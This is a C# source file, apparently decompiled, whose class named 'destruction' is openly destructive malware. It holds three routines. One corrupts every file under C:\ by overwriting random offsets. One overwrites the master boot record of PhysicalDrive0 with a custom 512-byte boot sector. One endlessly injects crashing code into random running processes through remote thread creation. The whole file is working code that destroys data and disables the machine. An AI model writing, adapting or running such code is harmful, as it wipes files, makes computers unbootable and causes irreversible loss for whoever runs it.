using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Risky1._0;

internal class destruction
{
	public const uint GENERIC_ALL = 268435456u;

	public const uint FILE_SHARE_READ = 1u;

	public const uint FILE_SHARE_WRITE = 2u;

	public const uint OPEN_EXISTING = 3u;

	private const uint PROCESS_ALL_ACCESS = 2035711u;

	private const uint MEM_COMMIT = 4096u;

	private const uint PAGE_EXECUTE_READWRITE = 64u;

	private static Random r = new Random();

	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32.dll")]
	public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll")]
	private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

	public static void file_corrupter()
	{
		string[] files = Directory.GetFiles("C:\\", "*", SearchOption.AllDirectories);
		string[] array = files;
		foreach (string path in array)
		{
			try
			{
				using FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite);
				long length = fileStream.Length;
				string s = "₨";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				Random random = new Random();
				int num = (int)(length / bytes.Length);
				for (int j = 0; j < num; j++)
				{
					long offset = random.Next(0, num);
					fileStream.Seek(offset, SeekOrigin.Begin);
					fileStream.Write(bytes, 0, bytes.Length);
				}
			}
			catch
			{
			}
		}
	}

	public static void wipe_MBR()
	{
		byte[] array = new byte[512]
		{
			250, 49, 192, 142, 208, 188, 0, 124, 251, 14,
			31, 184, 19, 0, 205, 16, 184, 0, 160, 142,
			192, 186, 200, 3, 48, 192, 238, 66, 185, 0,
			1, 49, 219, 190, 91, 125, 136, 216, 36, 63,
			48, 228, 1, 198, 172, 136, 196, 136, 194, 208,
			234, 48, 192, 238, 136, 224, 238, 136, 208, 238,
			254, 195, 226, 225, 187, 227, 124, 49, 255, 48,
			246, 185, 64, 1, 48, 210, 136, 208, 2, 6,
			182, 124, 36, 63, 215, 136, 244, 2, 38, 183,
			124, 128, 228, 63, 134, 196, 215, 0, 224, 2,
			6, 184, 124, 170, 254, 194, 226, 224, 254, 198,
			128, 254, 200, 114, 212, 180, 2, 183, 0, 182,
			24, 138, 22, 185, 124, 205, 16, 190, 187, 124,
			185, 40, 0, 180, 14, 138, 30, 186, 124, 172,
			183, 0, 205, 16, 254, 195, 226, 247, 254, 6,
			185, 124, 128, 62, 185, 124, 40, 114, 5, 198,
			6, 185, 124, 0, 254, 6, 182, 124, 254, 6,
			183, 124, 254, 6, 184, 124, 254, 6, 186, 124,
			235, 138, 0, 0, 0, 0, 1, 82, 105, 115,
			107, 121, 32, 77, 105, 115, 116, 121, 54, 46,
			54, 46, 54, 32, 102, 101, 101, 108, 115, 32,
			109, 121, 32, 68, 114, 101, 97, 109, 32, 80,
			97, 105, 110, 46, 46, 46, 32, 32, 35, 38,
			41, 44, 47, 49, 52, 54, 56, 58, 59, 60,
			61, 61, 62, 62, 62, 61, 61, 60, 59, 58,
			56, 54, 52, 49, 47, 44, 41, 38, 35, 32,
			29, 26, 23, 20, 17, 15, 12, 10, 8, 6,
			5, 4, 3, 3, 2, 2, 2, 3, 3, 4,
			5, 6, 8, 10, 12, 15, 17, 20, 23, 26,
			29, 32, 35, 38, 41, 44, 47, 49, 52, 54,
			56, 58, 59, 60, 61, 61, 62, 62, 62, 61,
			61, 60, 59, 58, 56, 54, 52, 49, 47, 44,
			41, 38, 35, 32, 29, 26, 23, 20, 17, 15,
			12, 10, 8, 6, 5, 4, 3, 3, 2, 2,
			2, 3, 3, 4, 5, 6, 8, 32, 35, 38,
			41, 44, 47, 49, 52, 54, 56, 58, 59, 60,
			61, 61, 62, 62, 62, 61, 61, 60, 59, 58,
			56, 54, 52, 49, 47, 44, 41, 38, 35, 32,
			29, 26, 23, 20, 17, 15, 12, 10, 8, 6,
			5, 4, 3, 3, 2, 2, 2, 3, 3, 4,
			5, 6, 8, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			85, 170
		};
		IntPtr hFile = CreateFile("\\\\.\\PhysicalDrive0", 268435456u, 3u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
		WriteFile(hFile, array, (uint)array.Length, out var _, IntPtr.Zero);
	}

	public static void process_crasher()
	{
		Random random = new Random();
		int id = Process.GetCurrentProcess().Id;
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			if (processes.Length != 0)
			{
				Process process;
				do
				{
					process = processes[random.Next(processes.Length)];
				}
				while (process.Id == id);
				try
				{
					IntPtr hProcess = OpenProcess(2035711u, bInheritHandle: false, process.Id);
					byte[] array = new byte[1] { 204 };
					IntPtr intPtr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)array.Length, 4096u, 64u);
					WriteProcessMemory(hProcess, intPtr, array, (uint)array.Length, out var _);
					CreateRemoteThread(hProcess, IntPtr.Zero, 0u, intPtr, IntPtr.Zero, 0u, out var _);
				}
				catch
				{
				}
				Thread.Sleep(5000);
			}
		}
	}
}
